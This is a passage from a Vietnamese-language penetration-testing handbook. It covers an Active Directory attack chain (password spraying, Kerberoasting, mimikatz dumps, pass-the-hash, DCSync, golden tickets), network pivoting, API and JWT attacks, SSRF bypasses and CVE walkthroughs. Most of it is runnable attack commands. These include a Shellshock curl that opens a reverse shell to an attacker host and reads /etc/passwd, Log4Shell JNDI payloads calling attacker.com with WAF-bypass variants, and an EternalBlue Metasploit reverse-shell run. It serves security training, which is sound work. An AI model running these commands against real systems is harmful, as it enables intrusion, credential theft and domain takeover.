# Certificate transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Port scan exposed assets
nmap -sS -sV -sC --top-ports 1000 -oA external_scan target.com

# Google dorks
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com ext:conf|env|log

# Shodan
# org:"Target Company"

═══════════════════════════════════════════════════════
PHASE 2: INITIAL FOOTHOLD
═══════════════════════════════════════════════════════

# Scenario A: Web app vulnerability (SSRF → internal access)
# Tìm SSRF → truy cập metadata service:
# http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Scenario B: VPN/RDP exposed
# Password spray (1 password, many users)
crackmapexec smb vpn.target.com -u users.txt -p 'Spring2024!' --no-bruteforce

# Scenario C: Phishing
# Evilginx2 → capture session cookie → bypass MFA

# Kết quả: Có 1 user account trên internal network
# user: jsmith, pass: Spring2024!

═══════════════════════════════════════════════════════
PHASE 3: INTERNAL ENUMERATION
═══════════════════════════════════════════════════════

# Network discovery
nmap -sn 10.10.10.0/24
crackmapexec smb 10.10.10.0/24

# BloodHound data collection
bloodhound-python -u jsmith -p 'Spring2024!' -d target.com -c All -ns 10.10.10.1

# Import vào BloodHound → tìm attack path to Domain Admin

# Enumerate shares
crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Spring2024!' --shares

# Responder (parallel - capture hashes)
sudo responder -I eth0 -wrf

═══════════════════════════════════════════════════════
PHASE 4: PRIVILEGE ESCALATION
═══════════════════════════════════════════════════════

# Kerberoast (tìm service accounts với weak password)
GetUserSPNs.py target.com/jsmith:'Spring2024!' -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# → Crack được: svc_backup / Backup2023!

# svc_backup có Backup Operators privileges → DCSync rights!

═══════════════════════════════════════════════════════
PHASE 5: LATERAL MOVEMENT
═══════════════════════════════════════════════════════

# WinRM access với svc_backup
evil-winrm -i 10.10.10.50 -u svc_backup -p 'Backup2023!'

# Dump credentials từ target host
mimikatz> sekurlsa::logonpasswords
# → Tìm được NTLM hash của domain admin đang logged in

# Pass-the-Hash đến Domain Controller
psexec.py -hashes :da_ntlm_hash target.com/da_admin@10.10.10.1

═══════════════════════════════════════════════════════
PHASE 6: DOMAIN DOMINANCE
═══════════════════════════════════════════════════════

# DCSync → dump tất cả credentials
secretsdump.py target.com/da_admin@10.10.10.1 -hashes :da_ntlm_hash -just-dc-ntlm

# Golden Ticket (persistence)
ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain target.com Administrator

═══════════════════════════════════════════════════════
PHASE 7: EVIDENCE & REPORTING
═══════════════════════════════════════════════════════

# Screenshot everything
# Document each step with timestamps
# Clean up: Remove tools, close sessions
# Write report: Executive summary + Technical findings + Remediation
```

## 35.2 Multi-Network Pivot Scenario

```bash
# Network layout:
# Attacker (10.10.14.5) → DMZ (10.10.10.0/24) → Internal (172.16.0.0/24) → Management (192.168.100.0/24)

# ═══ Step 1: Compromise DMZ host ═══
# Exploit web app on 10.10.10.100
# Get reverse shell

# ═══ Step 2: Enumerate from DMZ ═══
# On compromised host:
ip addr show    # Find second NIC: 172.16.0.10
for i in $(seq 1 254); do ping -c 1 -W 1 172.16.0.$i &>/dev/null && echo "172.16.0.$i alive"; done

# ═══ Step 3: Pivot to Internal ═══
# Upload chisel to DMZ host
# Attacker:
chisel server --reverse --port 8080
# DMZ host:
./chisel client 10.10.14.5:8080 R:socks

# Scan internal via proxy
proxychains nmap -sT -Pn -p 22,80,445,3389,5985 172.16.0.0/24

# ═══ Step 4: Lateral move in Internal ═══
proxychains evil-winrm -i 172.16.0.50 -u admin -p 'password'
# Find third NIC: 192.168.100.10

# ═══ Step 5: Double pivot to Management ═══
# On internal host, start second chisel client
# Or use ligolo-ng for cleaner multi-hop

# Attacker setup ligolo:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.0.0/24 dev ligolo
sudo ligolo-proxy -selfcert

# Agent on DMZ → proxy
# Add second route: sudo ip route add 192.168.100.0/24 dev ligolo
# Start second agent on internal host → proxy

# Now attacker can directly reach 192.168.100.0/24!
nmap -sV 192.168.100.1    # Management switch/firewall
```

---

# PHẦN 36: API SECURITY & BUG BOUNTY

## 36.1 API Security

### REST API Enumeration

```bash
# Tìm API endpoints
# Kiểm tra: /api, /api/v1, /api/v2, /graphql, /swagger, /openapi.json
ffuf -w /usr/share/wordlists/api-endpoints.txt -u http://target.com/FUZZ

# Swagger/OpenAPI discovery
curl http://target.com/swagger.json
curl http://target.com/openapi.json
curl http://target.com/v2/api-docs    # Spring Boot

# API fuzzing
ffuf -w params.txt -u "http://target.com/api/users?FUZZ=test" -fc 400

# HTTP method testing
for method in GET POST PUT DELETE PATCH OPTIONS; do
  echo -n "$method: "; curl -s -o /dev/null -w "%{http_code}" -X $method http://target.com/api/users
  echo
done

# IDOR testing (thay đổi ID)
# GET /api/users/100  → data của user 100
# GET /api/users/101  → data của user 101 (nếu thấy = IDOR!)
```

### JWT (JSON Web Token) Attacks

```bash
# JWT format: header.payload.signature (Base64URL encoded)

# === None Algorithm Attack ===
# Đổi alg thành "none" → server skip verification
# Original: {"alg":"HS256","typ":"JWT"}
# Modified: {"alg":"none","typ":"JWT"}
# Tool: jwt_tool
python3 jwt_tool.py TOKEN -X a    # Test alg:none

# === Key Confusion (RS256 → HS256) ===
# Server dùng RS256 (asymmetric), đổi sang HS256 (symmetric)
# Sign JWT bằng public key (ai cũng có) → server verify bằng cùng public key → valid!
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# === Brute force secret ===
hashcat -m 16500 jwt.txt wordlist.txt
# hoặc
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# === JWT common claims to modify ===
# sub: user ID (change for privilege escalation)
# role/admin: true/false
# exp: expiration (extend)
# iss: issuer (bypass if not validated)

# jwt_tool all-in-one
python3 jwt_tool.py TOKEN -M at    # Test ALL known attacks
```

### GraphQL Attacks

```bash
# === Introspection Query (Discovery) ===
# Lấy TOÀN BỘ schema (types, queries, mutations)
curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name}}}}}"}'

# Full introspection
curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{...FullType}}}fragment FullType on __Type{kind name fields(includeDeprecated:true){name args{name type{...TypeRef}}type{...TypeRef}}inputFields{name type{...TypeRef}}}fragment TypeRef on __Type{kind name ofType{kind name}}"}'

# Tools: graphql-voyager (visualization), InQL (Burp extension), graphw00f

# === Batch Query Attack ===
# GraphQL cho phép nhiều query trong 1 request
# → Brute force, enumeration nhanh hơn rate limit
[
  {"query":"{ user(id:1) { email } }"},
  {"query":"{ user(id:2) { email } }"},
  {"query":"{ user(id:3) { email } }"}
]

# === Injection ===
# query { user(name: "admin' OR '1'='1") { id email } }

# === Denial of Service ===
# Deep nested query → resource exhaustion
# { user { friends { friends { friends { ... } } } } }
```

### OAuth2 Attacks

```
OAuth2 Flows:
  Authorization Code: Server-side apps (most secure)
  Implicit: SPA (deprecated, token in URL)
  Client Credentials: Server-to-server
  PKCE: Mobile/SPA (recommended)

Attacks:
1. Authorization Code Interception:
   - Redirect URI manipulation: change redirect_uri to attacker
   - Open redirect on allowed redirect_uri → steal code

2. CSRF on OAuth:
   - Missing state parameter → attacker links victim's account to attacker's

3. Token Leakage:
   - Implicit flow: token in URL fragment → browser history, referrer header
   - Authorization code in server logs

4. Scope escalation:
   - Request higher scope than authorized

5. PKCE bypass:
   - Server doesn't validate code_verifier
   - Downgrade from S256 to plain
```

## 36.2 Bug Bounty Network Techniques

### Subdomain Takeover

```bash
# Nguyên lý: CNAME trỏ đến service đã bỏ (S3, Heroku, GitHub Pages, etc.)
# → Claim service → control subdomain content

# Step 1: Find CNAME records
dig CNAME sub.target.com
# Nếu trả về: sub.target.com CNAME xxxx.herokuapp.com
# VÀ xxxx.herokuapp.com = NXDOMAIN (không tồn tại)
# → Vulnerable!

# Step 2: Check with tools
subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json
nuclei -l subs.txt -t takeovers/

# Vulnerable services:
# AWS S3: "NoSuchBucket"
# GitHub Pages: "There isn't a GitHub Pages site here"
# Heroku: "No such app"
# Azure: "NXDOMAIN on *.azurewebsites.net"
# Shopify: "Sorry, this shop is currently unavailable"
```

### HTTP Request Smuggling

```
Nguyên lý: Frontend (reverse proxy/CDN) và backend parse HTTP request khác nhau
→ "Smuggle" 1 request bên trong 1 request khác

=== CL.TE (Content-Length vs Transfer-Encoding) ===
Frontend dùng Content-Length, Backend dùng Transfer-Encoding:

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

Frontend thấy: 1 request, 13 bytes body
Backend thấy: chunked body ends at "0\r\n\r\n", "SMUGGLED" = start of NEXT request!

=== TE.CL ===
Frontend dùng Transfer-Encoding, Backend dùng Content-Length:

POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

=== Detection ===
# Burp Suite extension: HTTP Request Smuggler
# smuggler.py tool
python3 smuggler.py -u http://target.com

# Impact: Cache poisoning, bypass security controls, credential theft
```

### CORS Misconfiguration

```bash
# Test CORS
curl -s -H "Origin: https://evil.com" -I http://target.com/api/data

# Vulnerable if response has:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → evil.com can read authenticated API responses!

# Common misconfigs:
# Reflect any Origin header → full CORS bypass
# Allow null origin → iframe sandbox attack
# Wildcard + credentials → browser blocks, but shows misconfigured mindset
# Regex bypass: evil-target.com matches .*target.com

# Exploit: Host JS on evil.com that fetches victim's API with credentials
```

### SSRF (Server-Side Request Forgery)

```bash
# Truy cập internal resources qua server-side request

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Internal services
http://localhost:8080/admin
http://127.0.0.1:6379/   # Redis
http://internal-db:3306/   # MySQL

# Bypass filters
http://127.0.0.1 → http://0x7f000001
http://127.0.0.1 → http://2130706433  (decimal)
http://127.0.0.1 → http://017700000001 (octal)
http://127.0.0.1 → http://0177.0.0.1
http://127.0.0.1 → http://[::1]  (IPv6)
http://127.0.0.1 → http://127.1
http://127.0.0.1 → http://0.0.0.0

# DNS rebinding: Domain resolves to external IP first (passes filter),
# then resolves to 127.0.0.1 on second request (server fetches internal)
```

---

# PHẦN 37: CTF NETWORK TIPS

## 37.1 Port Knocking

```bash
# Server ẩn port (ví dụ SSH), chỉ mở sau khi nhận đúng sequence of packets

# Client knock
knock target.com 7000 8000 9000          # Tool: knock
# Hoặc manual:
for port in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $port target.com; done
# Sau knock → port 22 mở → SSH vào

# Detect port knocking config:
# Tìm file /etc/knockd.conf trên target
# [SSH]
# sequence    = 7000,8000,9000
# command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

## 37.2 PCAP Analysis cho CTF

```bash
# === Workflow ===
# 1. Mở pcap trong Wireshark
# 2. Statistics → Protocol Hierarchy (xem protocols nào có)
# 3. Statistics → Conversations (xem ai nói chuyện với ai)
# 4. Statistics → Endpoints (list IPs)

# === Tìm flag trong pcap ===

# Tìm string
strings capture.pcap | grep -i "flag\|ctf\|key"
tshark -r capture.pcap -Y 'frame contains "flag"' -T fields -e data | xxd -r -p

# Extract files
tshark -r capture.pcap --export-objects http,exported/
tshark -r capture.pcap --export-objects smb,exported/
tshark -r capture.pcap --export-objects tftp,exported/

# DNS exfiltration reconstruction
tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name | \
  grep ".exfil.domain" | cut -d'.' -f1 | xxd -r -p

# ICMP data extraction
tshark -r capture.pcap -Y icmp -T fields -e data | xxd -r -p

# Follow all TCP streams (dump to files)
for i in $(seq 0 100); do
  tshark -r capture.pcap -z follow,tcp,ascii,$i 2>/dev/null > stream_$i.txt
done

# HTTP credentials
tshark -r capture.pcap -Y 'http.request.method == POST' \
  -T fields -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value

# FTP credentials
tshark -r capture.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' \
  -T fields -e ftp.request.command -e ftp.request.arg

# Wireless handshake extraction
tshark -r capture.pcap -Y 'eapol' -T fields -e wlan.sa

# === Common CTF Patterns ===
# Unusual protocols (ICMP with large payload, DNS with long subdomains)
# Covert channels (data hidden in sequence numbers, TTL values, IP ID)
# File carving from TCP streams
# Malware C2 beaconing (periodic connections)
# Steganography in network (LSB of packet lengths, timing channels)
```

## 37.3 Network Steganography

```
Nơi giấu data trong network traffic:

1. ICMP payload (thường padding bytes, ai cũng bỏ qua)
2. DNS subdomain (encoded data)
3. TCP ISN (Initial Sequence Number) → encode data
4. IP ID field (16 bit → encode 2 bytes per packet)
5. TTL value (encode byte per packet)
6. TCP Urgent Pointer (khi URG flag = 0, field bị bỏ qua)
7. IP Options / TCP Options (extensible, rarely inspected)
8. Packet timing (inter-packet delay encodes bits)
9. HTTP headers (custom X- headers, Cookie values)
10. TLS SNI (Server Name Indication)

# Detection: Statistical analysis, entropy measurement, protocol anomaly
```

---

# PHẦN 38: TOOL REFERENCE DEEP DIVE

## 38.1 Recon Tools

```bash
# === theHarvester ===
theHarvester -d target.com -b google,bing,linkedin,twitter -l 500
theHarvester -d target.com -b all                # Tất cả sources
# Output: Emails, hostnames, IPs, URLs

# === recon-ng ===
recon-ng
[recon-ng] > marketplace search
[recon-ng] > marketplace install recon/domains-hosts/hackertarget
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > options set SOURCE target.com
[recon-ng] > run
[recon-ng] > show hosts

# === crt.sh (Certificate Transparency) ===
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
# → List tất cả subdomain từng có SSL cert

# === waybackurls (archived URLs) ===
echo target.com | waybackurls | sort -u | grep -E '\.(js|json|xml|config|env|sql|bak)'

# === gau (Get All URLs) ===
echo target.com | gau --threads 5 | sort -u
```

## 38.2 Enumeration Tools

```bash
# === rpcclient (SMB/RPC enumeration) ===
rpcclient -U '' -N 192.168.1.100          # Anonymous
rpcclient -U 'user%pass' 192.168.1.100
rpcclient $> enumdomusers                 # List domain users
rpcclient $> enumdomgroups                # List groups
rpcclient $> queryuser 0x1f4              # Query user by RID
rpcclient $> querygroupmem 0x200          # Domain Admins members
rpcclient $> getdompwinfo                 # Password policy
rpcclient $> netshareenum                 # Shares

# === kerbrute (Kerberos brute force / user enum) ===
# User enumeration (no lockout risk!)
kerbrute userenum -d target.com userlist.txt --dc 192.168.1.1
# Password spray
kerbrute passwordspray -d target.com userlist.txt 'Spring2024!'
# Brute force
kerbrute bruteuser -d target.com passwords.txt admin

# === nbtscan ===
nbtscan 192.168.1.0/24
# Output: IP, NetBIOS name, user, MAC

# === ldapdomaindump ===
ldapdomaindump -u 'target.com\user' -p 'password' 192.168.1.1
# Output: HTML + JSON files with users, groups, computers, trusts, policies

# === enum4linux-ng ===
enum4linux-ng -A 192.168.1.100 -oJ output.json
# -A: All enumeration, -oJ: JSON output
# Replaces legacy enum4linux with JSON output and more checks

# === adidnsdump ===
adidnsdump -u 'target.com\user' -p 'password' 192.168.1.1
# Dump all DNS records from AD-integrated DNS
```

## 38.3 Post-Exploitation Tools

```bash
# === WinPEAS / LinPEAS (Privilege Escalation Enumeration) ===
# Download
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winpeas.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Run
.\winpeas.exe              # Windows - tìm tất cả PrivEsc vectors
chmod +x linpeas.sh && ./linpeas.sh    # Linux

# Output: Color-coded (RED = critical PrivEsc vector)
# Checks: Permissions, services, scheduled tasks, credentials, kernel exploits

# === Seatbelt (Windows situational awareness) ===
Seatbelt.exe -group=all
# Checks: Audit policies, browser data, clipboard, credentials,
#          env vars, firewall rules, installed products, network info,
#          PowerShell history, RDP sessions, scheduled tasks, tokens

# === LaZagne (Credential extraction) ===
# Extract passwords from: browsers, wifi, mail, databases, sysadmin tools, Git
laZagne.exe all               # Windows
python3 laZagne.py all        # Linux

# === pspy (Unprivileged process monitoring) ===
# Monitor processes WITHOUT root
./pspy64
# Detect: cron jobs, scripts run by other users, service restarts
# Useful for finding: writable scripts in cron, credentials in command lines

# === PowerView (AD Enumeration - PowerShell) ===
Import-Module .\PowerView.ps1
Get-DomainUser                          # All domain users
Get-DomainGroup -MemberIdentity "admin" # Groups user is member of
Get-DomainComputer -Unconstrained       # Unconstrained delegation
Find-DomainShare -CheckShareAccess      # Accessible shares
Get-DomainGPO                           # All GPOs
Find-LocalAdminAccess                   # Machines where current user is local admin
Get-DomainTrust                         # Domain trusts
Get-DomainObjectAcl -ResolveGUIDs       # ACLs

# === Mimikatz Full Reference ===
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords       # Dump ALL credentials in memory
mimikatz> sekurlsa::wdigest              # Cleartext passwords (if WDigest enabled)
mimikatz> sekurlsa::tickets /export      # Export Kerberos tickets
mimikatz> lsadump::sam                   # SAM database (local accounts)
mimikatz> lsadump::dcsync /user:krbtgt   # DCSync
mimikatz> lsadump::lsa /patch            # LSA secrets
mimikatz> vault::cred                    # Windows Vault credentials
mimikatz> dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
mimikatz> token::elevate                 # Impersonate SYSTEM
mimikatz> misc::skeleton                 # Skeleton Key injection

# === Rubeus Full Reference ===
Rubeus.exe kerberoast                    # Kerberoast all SPN accounts
Rubeus.exe asreproast                    # AS-REP Roast
Rubeus.exe harvest /interval:30          # Harvest TGTs every 30s
Rubeus.exe monitor /interval:5           # Monitor for new TGTs
Rubeus.exe s4u /user:svc /rc4:hash /impersonateuser:admin /msdsspn:cifs/target
Rubeus.exe ptt /ticket:base64            # Pass-the-Ticket
Rubeus.exe tgtdeleg                      # Get usable TGT from current session
Rubeus.exe createnetonly /program:cmd    # Logon session for PtT
Rubeus.exe hash /password:password       # Calculate NTLM hash

# === searchsploit ===
searchsploit apache 2.4                  # Search by software + version
searchsploit -x 12345                    # Examine exploit
searchsploit -m 12345                    # Copy exploit to current directory
searchsploit -p 12345                    # Show full path
searchsploit --nmap output.xml           # Parse nmap XML output
searchsploit -j apache 2.4              # JSON output
searchsploit --update                    # Update database

# === Responder Advanced ===
sudo responder -I eth0 -A               # Analyze mode (no poisoning, just observe)
sudo responder -I eth0 -v               # Verbose (see all requests)
sudo responder -I eth0 -f               # Fingerprint (OS detection)
sudo responder -I eth0 -wrf             # Full attack (WPAD + SMB + relay)
sudo responder -I eth0 --disable-ess    # Disable ESS (for relay)
# Logs: /usr/share/responder/logs/

# === evil-winrm Advanced ===
evil-winrm -i 192.168.1.100 -u admin -p 'pass'
*Evil-WinRM* PS> upload /local/file.exe C:\temp\file.exe
*Evil-WinRM* PS> download C:\temp\file.txt /local/
*Evil-WinRM* PS> Bypass-4MSI                 # AMSI bypass
*Evil-WinRM* PS> menu                        # Show all commands
# Load PowerShell scripts:
evil-winrm -i 192.168.1.100 -u admin -p 'pass' -s /scripts/
*Evil-WinRM* PS> PowerView.ps1               # Auto-load script
# Load DLL:
evil-winrm -i 192.168.1.100 -u admin -p 'pass' -e /dlls/
```

## 38.4 Scanning Alternatives

```bash
# === RustScan (fast port scanner → pipes to nmap) ===
rustscan -a 192.168.1.100 -- -sV -sC
# Scans all 65535 ports in seconds → passes open ports to nmap
rustscan -a 192.168.1.100 -p 22,80,443
rustscan -a 192.168.1.0/24 --batch-size 1024

# === AutoRecon (automated recon pipeline) ===
autorecon 192.168.1.100
# Auto-runs: nmap, gobuster, nikto, smbclient, enum4linux, etc.
# Output: Organized directory structure per target
autorecon 192.168.1.100 192.168.1.101 192.168.1.102   # Multiple targets

# === OWASP ZAP (Free Burp Suite alternative) ===
# GUI or CLI
zap-cli quick-scan http://target.com
zap-cli active-scan http://target.com
zap-cli spider http://target.com
# API: http://localhost:8080/JSON/
# HUD: Built-in heads-up display in browser
# Marketplace: Extensions similar to Burp
```

## 38.5 Wireless Tools

```bash
# === WiFite2 (Automated wireless attack) ===
sudo wifite                              # Auto-detect and attack
sudo wifite --kill                       # Kill interfering processes
sudo wifite -e "TargetNetwork"           # Target specific SSID

# === airgeddon ===
sudo bash airgeddon.sh                   # Interactive menu
# Features: Evil Twin, WPA handshake, PMKID, WPS, DoS

# === bully (WPS brute force) ===
bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
# Brute force WPS PIN → recover WPA password
# Alternative to reaver, often more reliable

# === Kismet (Wireless IDS/detector) ===
kismet -c wlan0                          # Start with interface
# Web UI: http://localhost:2501
# Detects: Rogue APs, deauth attacks, hidden SSIDs, Bluetooth, etc.
# Exports: pcap, KML (Google Earth), JSON
```

---

# PHẦN 39: CVE DEEP DIVES

## 39.1 EternalBlue (MS17-010) - SMBv1 RCE

```bash
# Năm: 2017 | Impact: Remote Code Execution | WannaCry ransomware

# Nguyên lý:
# SMBv1 transaction handling có buffer overflow
# Attacker gửi crafted SMB transaction → overwrite kernel memory
# → Execute code as SYSTEM (kernel-level exploitation)
# Không cần authentication!

# Detection
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100

# Exploitation (Metasploit)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker-ip
exploit
# → SYSTEM shell

# Affected: Windows XP → Windows Server 2016 (unpatched)
# Fix: MS17-010 patch, Disable SMBv1
# Lesson: Patch management critical, SMBv1 should be disabled everywhere
```

## 39.2 Heartbleed (CVE-2014-0160) - OpenSSL Memory Leak

```bash
# Năm: 2014 | Impact: Memory disclosure (passwords, private keys)

# Nguyên lý:
# TLS Heartbeat extension: Client gửi "ping" với payload + length
# Server trả lại payload theo length chỉ định
# BUG: Server KHÔNG CHECK length thực tế vs payload thực tế
# Client gửi: payload=1 byte, length=65535
# Server trả: 1 byte payload + 65534 bytes TỪ MEMORY!
# → Leak: passwords, session keys, private keys

# Request (simplified):
# "Send back 65535 bytes of this 1-byte payload"
# Server reads: 1 byte of payload + 65534 bytes of adjacent memory

# Detection
nmap --script ssl-heartbleed -p 443 target.com

# Exploitation
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.com
set VERBOSE true
run
# → Dump memory chunks, tìm credentials/keys

# Fix: Update OpenSSL ≥ 1.0.1g, revoke + reissue certificates
```

## 39.3 Log4Shell (CVE-2021-44228) - Log4j RCE

```bash
# Năm: 2021 | Impact: Remote Code Execution | CVSS 10.0

# Nguyên lý:
# Log4j (Java logging library) hỗ trợ JNDI lookup trong log messages
# Attacker gửi: ${jndi:ldap://attacker.com/evil}
# Server LOG chuỗi này → Log4j resolve JNDI
# → Kết nối đến attacker LDAP → download Java class → execute!

# Attack chain:
# 1. Attacker inject payload vào bất kỳ logged field:
#    User-Agent: ${jndi:ldap://attacker:1389/exploit}
#    X-Api-Version: ${jndi:ldap://attacker:1389/exploit}
#    Username field: ${jndi:ldap://attacker:1389/exploit}
# 2. Server logs the field → Log4j processes JNDI
# 3. Server connects to attacker LDAP
# 4. LDAP returns reference to Java class
# 5. Server downloads and executes class → RCE

# Detection
# Scan headers/params with payload
curl -H 'X-Api-Version: ${jndi:ldap://CALLBACK_IP/test}' http://target.com
# Monitor for callback on CALLBACK_IP

# WAF bypass variants:
${jndi:ldap://...}
${j${::-n}di:ldap://...}
${${lower:j}ndi:ldap://...}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://...}

# Fix: Update Log4j ≥ 2.17.0
```

## 39.4 Shellshock (CVE-2014-6271) - Bash RCE

```bash
# Năm: 2014 | Impact: Remote Code Execution

# Nguyên lý:
# Bash cho phép define function trong environment variable
# BUG: Bash execute code SAU function definition!
# env x='() { :; }; echo VULNERABLE' bash -c "echo test"
# Nếu in "VULNERABLE" → bash bị lỗi

# Exploitation (via CGI):
# Web server dùng CGI → pass HTTP headers as env vars → Bash processes them
curl -A '() { :; }; /bin/bash -c "cat /etc/passwd"' http://target.com/cgi-bin/test.cgi
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' http://target.com/cgi-bin/test.cgi

# Nmap detection
nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi -p 80 target.com

# Fix: Update Bash
```

## 39.5 ProxyLogon (CVE-2021-26855) & ProxyShell

```bash
# Năm: 2021 | Impact: Exchange Server RCE (pre-auth!)

# ProxyLogon chain:
# CVE-2021-26855: SSRF → authenticate as any user
# CVE-2021-27065: Arbitrary file write → webshell

# ProxyShell chain:
# CVE-2021-34473: Pre-auth path confusion → access backend
# CVE-2021-34523: Privilege escalation → SYSTEM
# CVE-2021-31207: Post-auth RCE → webshell

# Detection
nmap --script http-vuln-cve2021-26855 -p 443 target.com

# Chỉ check version:
curl -k https://target.com/owa/auth/logon.aspx | grep "version"

# Fix: Patch Exchange, enable Extended Protection
```

---

# PHẦN 40: MOBILE APP NETWORK TESTING

## 40.1 Android Proxy Setup Chi tiết

```bash
# === Android < 7 (Nougat) ===
# Cài certificate qua Settings → Security → Install from storage
# Done - app trust user certificates

# === Android 7+ (Network Security Config) ===
# Apps NO LONGER trust user-installed certificates by default!

# Method 1: Modify APK
apktool d target.apk -o target_dir
# Edit: target_dir/res/xml/network_security_config.xml
# Add:
# <network-security-config>
#   <base-config cleartextTrafficPermitted="true">
#     <trust-anchors>
#       <certificates src="system" />
#       <certificates src="user" />    ← ADD THIS
#     </trust-anchors>
#   </base-config>
# </network-security-config>
apktool b target_dir -o target_patched.apk
# Sign APK
keytool -genkey -v -keystore my.keystore -alias alias -keyalg RSA -keysize 2048
apksigner sign --ks my.keystore target_patched.apk
adb install target_patched.apk

# Method 2: Magisk Module (Rooted device)
# Install MagiskTrustUserCerts module
# → Moves user certs to system trust store on boot

# Method 3: Objection (Frida-based, no root needed)
objection -g com.target.app explore
> android sslpinning disable
```

## 40.2 Certificate Pinning Bypass

```bash
# === Frida Script ===
# Universal SSL Pinning Bypass
frida -U -f com.target.app -l ssl_bypass.js --no-pause

# ssl_bypass.js (simplified):
# Java.perform(function() {
#   var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
#   var SSLContext = Java.use('javax.net.ssl.SSLContext');
#   // Override checkServerTrusted to accept all certificates
#   // Override getAcceptedIssuers to return empty array
# });

# === Objection (Easier) ===
pip3 install objection
objection -g com.target.app explore
> android sslpinning disable
# Works for most apps immediately

# === iOS (Jailbroken) ===
# SSL Kill Switch 2 (Cydia tweak)
# Or Frida:
frida -U -f com.target.app -l ios_ssl_bypass.js

# === Common pinning implementations ===
# OkHttp CertificatePinner
# TrustKit
# Custom X509TrustManager
# Network Security Config (Android)
# AFNetworking (iOS)
# Each needs specific Frida hook
```

## 40.3 iOS Network Testing

```bash
# Setup proxy (non-jailbroken)
# Settings → Wi-Fi → HTTP Proxy → Manual
# Server: Burp/Charles IP, Port: 8080
# Install CA cert: Visit http://burp/ in Safari → Install Profile
# Settings → General → About → Certificate Trust Settings → Enable

# Traffic analysis
# Burp Suite / Charles Proxy intercept HTTPS traffic
# Check for: hardcoded API keys, insecure endpoints, sensitive data in logs

# Jailbroken device tools
# SSL Kill Switch 2
# Cycript (runtime manipulation)
# Frida
# Objection
```

---

# PHẦN 41: TOOL INSTALL GUIDE

> Tất cả tools trong guide — cách cài đặt đầy đủ.

## 41.1 Network Attack Tools

```bash
# === Core tools (Kali đã có sẵn, distro khác cần cài) ===
sudo apt install nmap masscan netcat-traditional ncat
sudo apt install dsniff              # arpspoof, macof, filesnarf
sudo apt install ettercap-text-only  # MITM framework
sudo apt install bettercap           # Modern MITM (hoặc: go install github.com/bettercap/bettercap@latest)
sudo apt install yersinia            # L2 attacks (DHCP, DTP, STP)
sudo apt install hydra               # Password brute force
sudo apt install hping3              # Packet crafting
sudo apt install responder           # LLMNR/NBT-NS poisoning
sudo apt install sslstrip            # SSL stripping (cần Python 2 — prefer bettercap thay thế)

# === Wireless ===
sudo apt install aircrack-ng         # WPA/WPA2 cracking suite
sudo apt install hcxdumptool hcxtools  # PMKID capture
sudo apt install kismet              # Wireless IDS

# === Scapy ===
pip3 install scapy
# Trong Scapy, toán tử / ghép layers: IP()/TCP() = IP packet chứa TCP segment

# === Impacket (AD/SMB/Kerberos tools) ===
pip3 install impacket
# Bao gồm: psexec.py, wmiexec.py, smbexec.py, secretsdump.py,
# GetUserSPNs.py, GetNPUsers.py, ntlmrelayx.py, smbserver.py

# === BloodHound (AD attack path) ===
pip3 install bloodhound                      # Python collector
sudo apt install neo4j                       # Graph database (required)
# BloodHound GUI: download từ https://github.com/BloodHoundAD/BloodHound/releases
# Hoặc BloodHound CE: docker compose up

# === Chisel (TCP tunneling) ===
# Download binary từ: https://github.com/jpillora/chisel/releases
# Hoặc: go install github.com/jpillora/chisel@latest

# === Ligolo-ng (Modern tunneling) ===
# Download proxy + agent từ: https://github.com/nicocha30/ligolo-ng/releases
# Cần cả ligolo-proxy (attacker) VÀ ligolo-agent (target)

# === DNS tunneling ===
sudo apt install iodine               # DNS tunnel
# dnscat2:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server && gem install bundler && bundle install  # Server
cd dnscat2/client && make                                    # Client

# === SSL testing ===
git clone https://github.com/drwetter/testssl.sh.git
# Hoặc: sudo apt install testssl.sh

# === Scanning alternatives ===
cargo install rustscan                 # Fast port scanner (cần nmap)
pip3 install autorecon                 # Automated recon pipeline

